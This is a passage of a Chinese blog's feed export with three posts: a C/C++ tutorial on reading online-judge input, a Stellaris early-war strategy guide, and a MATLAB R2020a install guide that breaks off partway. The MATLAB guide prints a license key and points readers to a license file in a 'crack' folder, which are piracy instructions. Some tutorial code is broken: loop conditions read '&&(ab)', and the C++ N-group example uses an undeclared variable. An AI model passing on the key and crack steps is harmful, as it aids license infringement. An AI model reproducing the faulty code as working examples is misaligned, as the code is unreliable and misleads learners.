CTRL-Z（即按住 CTRL 键不放，再按下 Z）组合作为输入结束，此谓键盘输入设备的“文件末尾”。</p><h3 id="一次运行输入多组数据由-N-决定"><a href="#一次运行输入多组数据由-N-决定" class="headerlink" title="一次运行输入多组数据由 N 决定"></a>一次运行输入多组数据由 N 决定</h3><p>一次运行，要输入多组数据，组数由第一个输入数据决定（在开始的时候输入一个 N，接下来是 N 组数据）</p><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a + b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">第一行是数据的组数N，从第二行是N组由两个整数（a和b）构成的输入，a和b之间用空格隔开，</span><br><span class="line">每组输入单独占一行 </span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">每组的两个整数（a和b）求和并输出，每组的求和结果独占一行</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">2</span><br><span class="line">1 5</span><br><span class="line">10 20</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">6</span><br><span class="line">30</span><br></pre></td></tr></table></figure><p>需要先读入第一行确定组数 N，而后写一次执行 N 次的循环进行处理即可。解决办法是：</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    int a,b;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    for(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span><br><span class="line">        printf(&quot;%d\n&quot;,a+b);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输入多组数据以特殊输入为结束标志"><a href="#输入多组数据以特殊输入为结束标志" class="headerlink" title="输入多组数据以特殊输入为结束标志"></a>输入多组数据以特殊输入为结束标志</h3><p>输入不说明有多少组数据，但以某个特殊输入为结束标志。平时做题中常见诸如“输入学生成绩，以 -1 结束”，没有学生得 -1 分的，这个结束数据可以要得。</p><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a + b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">多组由两个整数（a和b）构成的输入，a和b之间用空格隔开，每组输入单独占一行。</span><br><span class="line">当输入为 0 0 时，输入结束。</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">每组的两个整数（a和b）求和并输出，每组的求和结果独占一行。</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">1 5</span><br><span class="line">10 20</span><br><span class="line">0 0</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">6</span><br><span class="line">30</span><br></pre></td></tr></table></figure><p>构造循环对数据进行处理，将是否遇到了要求结束的输入，作为循环是否结束的依据。解决办法是：</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a,b;</span><br><span class="line">    while(scanf(&quot;%d %d&quot;,&amp;a, &amp;b) &amp;&amp;(ab))</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%d\n&quot;,a+b);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用文件重定向提高调试效率"><a href="#利用文件重定向提高调试效率" class="headerlink" title="利用文件重定向提高调试效率"></a>利用文件重定向提高调试效率</h3><blockquote><p>编程得到正确结果前，往往需要多次运行程序，每次运行都需要花费不少的时间从键盘输入数据。每次输入的数据都是相同的时，会给人的心理带来不爽的感觉，并造成时间上的浪费。无论平时练习还是 ACM 竞赛实战，这些都是可以避免的。方法是，运用重定向。</p></blockquote><p>用下面的形式调用函数 freopen() 会将标准输入 stdin 重定向到文件 input.txt（这个名字可以自己定义）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//设置输入和输出文件</span><br><span class="line">freopen(&quot;input.txt&quot;,&quot;r&quot;,stdin);    </span><br></pre></td></tr></table></figure><p>重定向后，原先从键盘（标准输入的默认设备）接受的输入，将统统从文件读取 input.txt 读取，这就是重定向。程序可以写作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //只加这一句输入将被重定向到文件input.txt</span><br><span class="line">    freopen(&quot;input.txt&quot;,&quot;r&quot;,stdin);  </span><br><span class="line">    int a,b;</span><br><span class="line">    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span><br><span class="line">    printf(&quot;%d\n&quot;,a+b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是，在运行程序前，将本该由键盘输入的数据，写到文件 input.txt 中。而在运行程序时，数据将不再需要人去输入。那个快，很享受。</p><p>需要注意的是，调试通过的程序，千万不要直接提交到 OJ 平台上去。如果竞赛中这样做了，罚你的 20 分钟不要算到我的头上。提交的程序要把输入重定向的一行删除，这样才算是符合要求的，可以获得 AC 的程序。</p><p>除了删除那一行，还有一种简单的做法是，提交前将这一行前加上注释符”&#x2F;&#x2F;“，效果是一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //freopen(&quot;input.txt&quot;,&quot;r&quot;,stdin);  //只加这一句输入将被重定向到文件input.txt</span><br><span class="line">    int a,b;</span><br><span class="line">    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span><br><span class="line">    printf(&quot;%d\n&quot;,a+b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h2><h3 id="简单的输入一组数据-1"><a href="#简单的输入一组数据-1" class="headerlink" title="简单的输入一组数据"></a>简单的输入一组数据</h3><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a+b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">两个整数 a,b</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">a+b的值</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">1 2</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>这种简单输入，接受一组输入，针对这种输入计算出值即可。</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int  main()</span><br><span class="line">&#123;</span><br><span class="line">    int a,b;</span><br><span class="line">    //cin以空格或者回车作为输入输出分隔符</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    cout &lt;&lt; a+b &lt;&lt; endl;   </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一次运行输入多组数据直到读至-EOF-1"><a href="#一次运行输入多组数据直到读至-EOF-1" class="headerlink" title="一次运行输入多组数据直到读至 EOF"></a>一次运行输入多组数据直到读至 EOF</h3><p>一次运行，要输入多组数据，直到读至输入文件末尾（EOF）为止</p><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a + b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">多组由两个整数（a和b）构成的输入，a和b之间用空格隔开,</span><br><span class="line">每组输入单独占一行 </span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">每组的两个整数（a和b）求和并输出，每组的求和结果独占一行</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">1 5</span><br><span class="line">10 20</span><br><span class="line">400 516</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">6</span><br><span class="line">30</span><br><span class="line">916</span><br></pre></td></tr></table></figure><p>这种输入包含多对输入数据，需要构造一个循环读取。因为没有指出到底有多少对输入，要有办法判断输入何时结束。解决办法是：</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt; </span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a,b;</span><br><span class="line">    while(cin &gt;&gt; a &gt;&gt; b)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; a+b &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>注 1：当读到输入结束时，cin &gt;&gt; a &gt;&gt; b 返回 0，循环也结束。</p><p>注 2：在调试程序时，键盘输入的数据，用 CTRL-Z（即按住 CTRL 键不放，再按下 Z）组合作为输入结束，此谓键盘输入设备的“文件末尾”。</p><h3 id="一次运行输入多组数据由-N-决定-1"><a href="#一次运行输入多组数据由-N-决定-1" class="headerlink" title="一次运行输入多组数据由 N 决定"></a>一次运行输入多组数据由 N 决定</h3><p>一次运行，要输入多组数据，组数由第一个输入数据决定（在开始的时候输入一个 N，接下来是 N 组数据）</p><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a + b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">第一行是数据的组数N，从第二行是N组由两个整数（a和b）构成的输入，a和b之间用空格隔开，</span><br><span class="line">每组输入单独占一行 </span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">每组的两个整数（a和b）求和并输出，每组的求和结果独占一行</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">2</span><br><span class="line">1 5</span><br><span class="line">10 20</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">6</span><br><span class="line">30</span><br></pre></td></tr></table></figure><p>需要先读入第一行确定组数 N，而后写一次执行 N 次的循环进行处理即可。解决办法是：</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main() &#123;</span><br><span class="line">    int a, b, n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    for(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">        cout &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输入多组数据以特殊输入为结束标志-1"><a href="#输入多组数据以特殊输入为结束标志-1" class="headerlink" title="输入多组数据以特殊输入为结束标志"></a>输入多组数据以特殊输入为结束标志</h3><p>输入不说明有多少组数据，但以某个特殊输入为结束标志。平时做题中常见诸如“输入学生成绩，以 -1 结束”，没有学生得 -1 分的，这个结束数据可以要得。</p><p>【Example Subject】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">计算 a + b</span><br><span class="line"></span><br><span class="line">Input</span><br><span class="line">多组由两个整数（a和b）构成的输入，a和b之间用空格隔开，每组输入单独占一行。</span><br><span class="line">当输入为 0 0 时，输入结束。</span><br><span class="line"></span><br><span class="line">Output</span><br><span class="line">每组的两个整数（a和b）求和并输出，每组的求和结果独占一行。</span><br><span class="line"></span><br><span class="line">Sample Input</span><br><span class="line">1 5</span><br><span class="line">10 20</span><br><span class="line">0 0</span><br><span class="line"></span><br><span class="line">Sample Output</span><br><span class="line">6</span><br><span class="line">30</span><br></pre></td></tr></table></figure><p>构造循环对数据进行处理，将是否遇到了要求结束的输入，作为循环是否结束的依据。解决办法是：</p><p>【Method】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a ,b;</span><br><span class="line">    while(cin&gt;&gt;a&gt;&gt;b&amp;&amp;(ab))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;a+b&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用文件重定向提高调试效率-1"><a href="#利用文件重定向提高调试效率-1" class="headerlink" title="利用文件重定向提高调试效率"></a>利用文件重定向提高调试效率</h3><blockquote><p>编程得到正确结果前，往往需要多次运行程序，每次运行都需要花费不少的时间从键盘输入数据。每次输入的数据都是相同的时，会给人的心理带来不爽的感觉，并造成时间上的浪费。无论平时练习还是 ACM 竞赛实战，这些都是可以避免的。方法是，运用重定向。</p></blockquote><p>用下面的形式调用函数 freopen() 会将标准输入 stdin 重定向到文件 input.txt（这个名字可以自己定义）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//设置输入和输出文件</span><br><span class="line">freopen(&quot;input.txt&quot;,&quot;r&quot;,stdin);    </span><br></pre></td></tr></table></figure><p>重定向后，原先从键盘（标准输入的默认设备）接受的输入，将统统从文件读取 input.txt 读取，这就是重定向。程序可以写作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;cstdio&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    freopen(&quot;input.txt&quot;,&quot;r&quot;,stdin);  //只加这一句输入将被重定向到文件input.txt</span><br><span class="line">    int a,b;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    cout&lt;&lt;a+b&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是，在运行程序前，将本该由键盘输入的数据，写到文件 input.txt 中。而在运行程序时，数据将不再需要人去输入。那个快，很享受。</p><p>需要注意的是，调试通过的程序，千万不要直接提交到 OJ 平台上去。如果竞赛中这样做了，罚你的 20 分钟不要算到我的头上。提交的程序要把输入重定向的一行删除，这样才算是符合要求的，可以获得 AC 的程序。</p><p>除了删除那一行，还有一种简单的做法是，提交前将这一行前加上注释符”&#x2F;&#x2F;“，效果是一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;cstdio&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //freopen(&quot;input.txt&quot;,&quot;r&quot;,stdin);  //只加这一句输入将被重定向到文件input.txt</span><br><span class="line">    int a,b;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    cout&lt;&lt;a+b&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>群星实战打法之一--早战篇(3.0版本适配)</title>
      <link href="/1632.html"/>
      <url>/1632.html</url>
      
        <content type="html"><![CDATA[<p>以下为3.0版本早战教程改动:</p><p>政策中，经济政策改为军事经济</p><p>环开开局时将不以科研作为首要目标。</p><p>前期的DNA操作基本不变。</p><p>合金开始转换为自产为主。</p><p>以下为正文:</p><p>根据机械天团3.0的环开早战演示进行的总结。<br>现在环开开局是1苹果区划和1工业区划，开局是有5个合金岗位的。</p><p>但是对于自产而言并不够，40护卫&#x3D;3600合金，如果要在06年之前出征ai，大约在前三年出第二个工业区划，才能满足大约额外的q2-2.5k合金。前三年能出至多1k多。</p><p>3.0环开现在是两个区划开局，虽然每个区划的成本减半，但是神秘发电机是只提供两个区划的维护费。新的工业区划的维护费需要自己付。</p><p>当然，问题不大。通过国内市场的每月贸易买一个易爆微粒，配合剩下的50可以支撑四年。</p><p>但是要注意一点:工业区划会同时提供消费品岗位和合金岗位。但是消费品是没必要的，只要保证不是负的即可。所以消费品岗位的使用要手动减少，不然第二个工业区划会强行把一产人口拉上来，经济爆炸。</p><p>ai实力判断:情报系统表面上限制了信息获取，但本来玩家就是对ai的降维打击，并无大碍。<br>根据接触判断ai类型:如果是科研船暴毙，首先考虑种族洁癖、弑杀蜂群、铁心灭绝。<br>根据ai首都建筑、人口判断ai:如果有机器人厂就是机械师开局，诸如此类。<br>通过人口的思潮，可以看出国内思潮是以什么思潮为主。<br>ai战斗力在前7年基本不可能超过1k，因为ai不会超舰容爆船。</p><p>传统依然是至高首发，优先点出那个减少造船花费20%的那个(记不清是哪一个了)，点出后就开始造船。</p><p>影响力永远是早战最紧缺的资源，所以不要铺地，同时，也不要宣称ai除首都之外的殖民地。这样可以获得羞辱宣战选项，达成目标可以退回100影响力。</p><p>陆军大概六队陆军足矣，实在怕的可以八队，大约一年半至两年的时间。六队陆军只要不是石头人警察局非常强壮这种极度sm的早战杀手都能打得过。</p><p>战斗:不论首都是不是接壤(好像除了联邦开局都没有)，先打掉一个哨站，哨站一定要与首都接壤。</p><p>然后，陆军与舰队一定要准备好同时过境到首都星系。这个时候由于ai战斗力不够不会选择硬拼，会在你的舰队离开之后收复失地。</p><p>这就又出现一个bug:同星系间的敌对舰队不会交战(操作合理的话)。<br>选取目标首都星系，在你的舰队入场的地方向左或右拉一条直线，避免交战。这时ai的船会直接去丢掉的星系，而不会主动和你的主力交战。主力直接打掉空间站，陆军上球，一气呵成。如果厌战度不够，抓一下小舰队就行。如果难以在几个月内达到胜利条件就议和，球到了就行，还要赶紧打下一家ai。</p><p>仍然会涉及到负电运营。操作依然需要，而且是决定性因素。</p><p>打完之后，由于已经有了一个普通球，合金主产区可以迁移到新球上，邀请我们的新朋友帮我们打工，而且它们也很乐意，觉得为我们产合金是一种荣誉，主动要求工资减半，全天工作，还不要完整公民权。这个时候把环上面多造的一个工业区划拆了，不要心疼，提供的合金已经回本了。新的工业区划在新球上造。</p><p>每一家ai都是同样的方法，只是打起来伤不伤的问题。打肯定都打得过。</p><p>其它未提及的，如科技、飞升等，参照2.8版本早战教程:</p><p><a href="https://blog.gjcloak.top/1630.html">群星实战打法之一——早战篇(止步2.8)</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> P社 </tag>
            
            <tag> 群星 </tag>
            
            <tag> 3.0 </tag>
            
            <tag> 早战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab 使用指南</title>
      <link href="/55.html"/>
      <url>/55.html</url>
      
        <content type="html"><![CDATA[<p>MATLAB 是一种高级语言和交互式环境，全世界数以百万计的工程师和科学家都在使用它。它能够探索和可视化想法，并在各个领域进行协作，包括信号和图像处理，通信，管理系统和金融工程等等。</p><h2 id="一、功能概述"><a href="#一、功能概述" class="headerlink" title="一、功能概述"></a>一、功能概述</h2><ul><li>执行各种复杂的数学计算和繁重的工作</li><li>用于管理代码，文件和数据的开发环境</li><li>探索实现此解决方案的方法</li><li>各种数学函数，用于线性代数，统计，傅立叶分析，优化，滤波，数值积分…</li><li>绘制二维和三维图形函数以将数据可视化</li><li>使用 C ++，C 或 Java 编程语言设计和构建用户界面</li><li>能够测试和测量确切的功能和图形</li><li>通信信号处理，图像和视频的可能性</li><li>电信，控制，模糊，估计，统计，数据收集，模拟系统，</li></ul><h2 id="二、安装要求"><a href="#二、安装要求" class="headerlink" title="二、安装要求"></a>二、安装要求</h2><ul><li><p>操作系统 64 位：</p><p>Windows 10</p><p>Windows 7 Service Pack 1</p><p>Windows Server 2016</p><p>Windows Server 2019</p></li><li><p>CPU：</p><p>最低：任何 Intel 或 AMD x64 处理器</p><p>推荐任何具有四个逻辑核心和 AVX2 指令集</p><p>支持的 Intel 或 AMD x64 处理器</p></li><li><p>磁盘：</p><p>最小：仅 2 GB的 HDD 空间仅用于 MATLAB，典型安装为 4-6 GB</p><p>推荐：建议使用 SSD 完整安装所有 MathWorks 产品可能会占用 31GB 的磁盘空间</p></li><li><p>内存：</p><p>最低：4 GB</p><p>推荐：8 GB</p></li><li><p>GPU：</p><p>不需要特定的图形卡。</p><p>建议使用硬件加速的图形卡，该图形卡支持OpenGL 3.3和1GB GPU内存。</p><p>使用 Parallel Computing Toolbox 进行 GPU 加速需要 CUDA GPU</p><p>对于 Polyspace，建议每个内核 4 GB</p></li><li><p>注意：</p><p>从R2020a 开始支持</p><p>Windows Server 2019-从 R2020a 开始不支持 Windows Server 2012 和 Windows Server 2012 R2。对于 Polyspace，建议每个内核4 GB</p></li></ul><h2 id="三、软件安装"><a href="#三、软件安装" class="headerlink" title="三、软件安装"></a>三、软件安装</h2><p>前言：这里之所以要安装最新的 2020 版本，是因为 matlab 中的硬件支持工具是随着版本变化而变化的，所以要升级 matlab 版本</p><p>这里使用的是 MATLAB R2020a v9.8.0 中文版 64位</p><p>在文件替换那一步容易出现问题，仔细查看安装教程。</p><h3 id="3-1-下载解压后打开-R2020a-文件夹"><a href="#3-1-下载解压后打开-R2020a-文件夹" class="headerlink" title="3.1 下载解压后打开 R2020a 文件夹"></a>3.1 下载解压后打开 R2020a 文件夹</h3><p>重要提示：安装包不要放在中文命名的文件夹下！</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703112554.png" alt="image-20200703112533270" title="image-20200703112533270"></p><h3 id="3-2-运行-setup"><a href="#3-2-运行-setup" class="headerlink" title="3.2 运行 setup"></a>3.2 运行 setup</h3><p>右键以管理员身份运行 setup</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703112748.png" alt="image-20200703112747567" title="image-20200703112747567"></p><h3 id="3-3-右上角下拉高级选项"><a href="#3-3-右上角下拉高级选项" class="headerlink" title="3.3 右上角下拉高级选项"></a>3.3 右上角下拉高级选项</h3><p><strong>选择我有文件安装密钥</strong></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703112911.png" alt="image-20200703112910191" title="image-20200703112910191"></p><h3 id="3-4-勾选接受，点击下一步"><a href="#3-4-勾选接受，点击下一步" class="headerlink" title="3.4 勾选接受，点击下一步"></a>3.4 勾选接受，点击下一步</h3><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113005.png" alt="image-20200703113004691" title="image-20200703113004691"></p><h3 id="3-5-输入密钥"><a href="#3-5-输入密钥" class="headerlink" title="3.5 输入密钥"></a>3.5 输入密钥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">09806-07443-53955-64350-21751-41297</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113132.png" alt="image-20200703113131342" title="image-20200703113131342"></p><h3 id="3-6-点击浏览"><a href="#3-6-点击浏览" class="headerlink" title="3.6 点击浏览"></a>3.6 点击浏览</h3><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113229.png" alt="image-20200703113228070" title="image-20200703113228070"></p><h3 id="3-7-选择-crack-文件下的-license-standalone-lic"><a href="#3-7-选择-crack-文件下的-license-standalone-lic" class="headerlink" title="3.7 选择 crack 文件下的 license_standalone.lic"></a>3.7 选择 crack 文件下的 license_standalone.lic</h3><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113416.png" alt="image-20200703113415773" title="image-20200703113415773"></p><p>点击下一步</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113450.png" alt="image-20200703113449347" title="image-20200703113449347"></p><h3 id="3-8-修改安装位置，点击下一步（30GB空间）"><a href="#3-8-修改安装位置，点击下一步（30GB空间）" class="headerlink" title="3.8 修改安装位置，点击下一步（30GB空间）"></a>3.8 修改安装位置，点击下一步（30GB空间）</h3><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113635.png" alt="image-20200703113634549" title="image-20200703113634549"></p><h3 id="3-9-选择产品点击下一步"><a href="#3-9-选择产品点击下一步" class="headerlink" title="3.9 选择产品点击下一步"></a>3.9 选择产品点击下一步</h3><p>小编默认安装全部，小伙伴可根据需求安装</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113741.png" alt="image-20200703113739997" title="image-20200703113739997"></p><h3 id="3-10-勾选添加快捷方式，点击下一步"><a 